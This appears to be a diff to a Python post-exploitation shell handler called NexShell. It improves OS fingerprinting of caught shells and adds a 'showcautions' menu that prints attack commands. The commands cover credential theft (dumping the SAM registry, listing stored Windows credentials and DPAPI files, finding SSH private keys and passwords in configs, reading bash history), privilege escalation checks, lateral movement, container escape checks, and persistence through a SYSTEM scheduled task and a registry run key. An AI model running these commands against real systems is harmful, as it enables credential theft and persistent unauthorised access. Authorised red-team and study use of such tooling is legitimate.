@@ -1068,20 +1068,31 @@ class Session:
 
     def _fingerprint(self):
         # Wait a short moment for initial banner data to arrive
-        time.sleep(1.0)
+        time.sleep(0.8)
         initial_data = self.shell_response_buf.getvalue().decode(errors='replace')
         
         # Detect OS from initial welcome / prompt text
         detected_os = detect_os(initial_data)
         
-        # Fallback command probe if initial data doesn't confirm OS
-        if detected_os == 'Linux' and not any(x in initial_data for x in ('uid=', 'Linux', '/bin/')):
+        # Active probe — always send a quick OS detection command
+        # This is critical for raw powershell/cmd shells that have no banner
+        self.shell_response_buf = io.BytesIO()
+        # Send both Windows and Linux probes — only one will return output
+        self.send(b"echo __NEXOS__; echo %OS%; echo $env:OS\n")
+        time.sleep(1.2)
+        probe_out = self.shell_response_buf.getvalue().decode(errors='replace')
+        
+        if 'Windows_NT' in probe_out or 'Windows' in probe_out:
+            detected_os = 'Windows'
+        elif 'uid=' in probe_out or '/bin/' in probe_out or 'Linux' in probe_out:
+            detected_os = 'Linux'
+        elif detected_os == 'Linux' and not any(x in initial_data for x in ('uid=', 'Linux', '/bin/')):
+            # Secondary fallback: try whoami /priv (windows-only)
             self.shell_response_buf = io.BytesIO()
-            # Try Windows command
-            self.send(b"echo %OS%\n")
+            self.send(b"whoami /priv 2>nul\n")
             time.sleep(0.8)
-            probe_out = self.shell_response_buf.getvalue().decode(errors='replace')
-            if 'Windows' in probe_out:
+            fallback_out = self.shell_response_buf.getvalue().decode(errors='replace')
+            if 'Privilege Name' in fallback_out or 'SeShutdownPrivilege' in fallback_out:
                 detected_os = 'Windows'
                 
         self.OS = detected_os
@@ -1095,8 +1106,11 @@ class Session:
         lines = [l.strip() for l in whoami_out.splitlines() if l.strip()]
         user = 'unknown'
         if lines:
+            # Skip echo, prompt lines, and noise
+            skip_words = ('whoami', 'echo', '__nexos__', 'windows_nt', '$env:os', '%os%')
             for line in reversed(lines):
-                if 'whoami' not in line.lower() and not line.startswith('echo') and 'Microsoft' not in line:
+                ll = line.lower()
+                if not any(s in ll for s in skip_words):
                     user = line
                     break
         
@@ -1460,7 +1474,7 @@ class MainMenu(BetterCMD):
         self._timer   = None
         self._hist_mgr= None
         self.commands = {
-            "Session Operations":  ['run','upload','download','open','maintain','spawn','upgrade','exec','script','portfwd','tag','quickenum','credharvest','privesc'],
+            "Session Operations":  ['run','upload','download','open','maintain','spawn','upgrade','exec','script','portfwd','tag','quickenum','credharvest','privesc','showcautions'],
             "Session Management":  ['sessions','use','interact','kill','dir|.'],
             "Shell Management":    ['listeners','payloads','connect','Interfaces'],
             # ── v2 commands ────────────────────────────────────────────────────
@@ -1478,7 +1492,7 @@ class MainMenu(BetterCMD):
             "Configuration":      ['config', 'template'],
             "Platform":           ['health', 'stats'],
             # ──────────────────────────────────────────────────────────────────
-            "Miscellaneous":       ['help','history','cd','reset','SET','exit|quit|q'],
+            "Miscellaneous":       ['help','history','cd','reset','clear|cls','SET','exit|quit|q'],
         }
         # Initialize UI features from the new ui module
         ui = _load_ui()
@@ -1513,6 +1527,10 @@ class MainMenu(BetterCMD):
             try:
                 self.active.wait()
                 raw = self.cmdqueue.pop(0) if self.cmdqueue else input(self.prompt)
+                # Ctrl+L: clear screen on Windows (input() intercepts \x0c)
+                if raw == '\x0c' or raw.strip() == '\x0c':
+                    self.do_clear(None)
+                    continue
                 # Empty input -> trigger quick actions bar
                 if not raw.strip():
                     ui = _load_ui()
@@ -2341,12 +2359,108 @@ class MainMenu(BetterCMD):
         else: cmdlogger.error("'reset' not found")
 
     def do_clear(self, line):
-        """— Clear terminal screen"""
-        os.system('cls' if os.name == 'nt' else 'clear')
+        """— Clear terminal screen (also: Ctrl+L)"""
+        # Use ANSI escape + os.system for cross-platform compat
+        sys.stdout.write('\033[2J\033[H')
+        sys.stdout.flush()
 
     def do_cls(self, line):
         """— Clear terminal screen"""
         self.do_clear(line)
+
+    def do_showcautions(self, line):
+        """— Show OS-aware exploitation suggestions for current session"""
+        s = core.sessions.get(self.sid)
+        if not s:
+            cmdlogger.warning('No active session. Use: use [ID]')
+            return
+        os_type = getattr(s, 'OS', 'Linux')
+        user     = getattr(s, 'user', '?')
+        is_root  = getattr(s, 'is_root', False)
+        priv_icon = paint('◆ ROOT').red if is_root else paint('◇ USER').yellow
+
+        print(f"\n  {paint('NexShell').purple_BRIGHT} — {paint('Exploitation Suggestions').lime}")
+        print(f"  {'─'*60}")
+        print(f"  Target OS   : {paint(os_type).cyan}")
+        print(f"  Current User: {paint(user).yellow}  {priv_icon}")
+        print()
+
+        if os_type == 'Windows':
+            sections = [
+                ("🔍 Enumeration", [
+                    ("plugins run auto-enum-windows",    "Full system enumeration (users, groups, OS, creds...)"),
+                    ("plugins run cred-hunter",          "Hunt for credentials (files, env vars, registry...)"),
+                    ("plugins run privesc-scanner",      "Scan for local privilege escalation vectors"),
+                    ("plugins run network-scout",        "Discover internal network, shares, open ports"),
+                    ("plugins run persistence-check",    "Check for existing persistence mechanisms"),
+                ]),
+                ("⬆️  Privilege Escalation", [
+                    ("run privesc",                       "Run built-in Windows PrivEsc advisor"),
+                    ("exec whoami /priv",                 "Check current token privileges"),
+                    ("exec whoami /groups",               "Check group memberships"),
+                    ("exec systeminfo",                   "Get full system info (patch level, KB)"),
+                    ("exec reg query HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\Installer /v AlwaysInstallElevated", "Check AlwaysInstallElevated"),
+                ]),
+                ("🔑 Credential Access", [
+                    ("exec cmdkey /list",                 "List stored Windows credentials (cmdkey)"),
+                    ("exec net user",                     "List all local users"),
+                    ("exec net localgroup administrators","List local admins"),
+                    ("exec reg query HKLM\\\\SAM",        "Query SAM registry (may need SYSTEM)"),
+                    ("exec dir /b %USERPROFILE%\\\\AppData\\\\Roaming\\\\Microsoft\\\\Credentials", "List DPAPI credential files"),
+                ]),
+                ("🔗 Lateral Movement", [
+                    ("plugins run lateral-mover",         "Scan for SMB, WMI, WinRM lateral paths"),
+                    ("exec net view /all",                "Discover network shares"),
+                    ("exec arp -a",                       "Show ARP table (discover hosts)"),
+                ]),
+                ("📌 Persistence", [
+                    ("exec schtasks /create /sc onlogon /tn nexshell /tr calc.exe /ru SYSTEM", "Add scheduled task"),
+                    ("exec reg add HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v nexshell /t REG_SZ /d cmd.exe", "Add registry run key"),
+                ]),
+            ]
+        else:  # Linux / macOS / BSD
+            sections = [
+                ("🔍 Enumeration", [
+                    ("plugins run auto-enum-linux",      "Full Linux post-exploitation enumeration"),
+                    ("plugins run cred-hunter",          "Hunt for passwords in files, env, configs"),
+                    ("plugins run network-scout",        "Discover internal network, ports, services"),
+                    ("plugins run persistence-check",    "Check for backdoors, cron jobs, systemd units"),
+                    ("run quickenum",                    "Run built-in quick Linux enum script (in-memory)"),
+                ]),
+                ("⬆️  Privilege Escalation", [
+                    ("run privesc",                       "Run PrivEsc advisor script"),
+                    ("exec sudo -l",                      "Check sudo rights"),
+                    ("exec find / -perm -4000 -type f 2>/dev/null | head -20", "List SUID binaries"),
+                    ("exec getcap -r / 2>/dev/null",      "List capabilities"),
+                    ("exec cat /etc/passwd | grep -v nologin", "Readable users"),
+                    ("exec cat /etc/crontab",             "Check cron jobs"),
+                ]),
+                ("🔑 Credential Access", [
+                    ("run credharvest",                   "Run CredHarvest script (env, configs, keys)"),
+                    ("exec cat ~/.bash_history",          "Read bash history"),
+                    ("exec find / -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null", "Find SSH private keys"),
+                    ("exec find / -name '*.conf' 2>/dev/null | xargs grep -l 'password' 2>/dev/null | head -10", "Search config files for passwords"),
+                ]),
+                ("🔗 Lateral Movement", [
+                    ("plugins run lateral-mover",         "Scan for NFS, SSH lateral paths"),
+                    ("exec cat /etc/hosts",               "Read hosts file"),
+                    ("exec arp -a",                       "ARP table (discover network hosts)"),
+                    ("exec ss -tlnp",                     "List listening ports and services"),
+                ]),
+                ("🐳 Container Escape", [
+                    ("run container",                     "Check for container escape vectors"),
+                    ("exec ls -la /var/run/docker.sock",  "Check Docker socket access"),
+                    ("exec cat /proc/1/cgroup",           "Detect if inside container"),
+                ]),
+            ]
+
+        for section_title, tips in sections:
+            print(f"  {paint(section_title).orange}")
+            for cmd, desc in tips:
+                print(f"    {paint('>').teal} {paint(cmd).lime:<60}  {paint(desc).darkgrey}")
+            print()
+        print(f"  {paint('Tip').yellow}: Run with '?' for help on any command. E.g: exec ?  plugins ?")
+        print()
 
     # ══════════════════════════════════════════════════════════════════════════
     # v2 COMMANDS
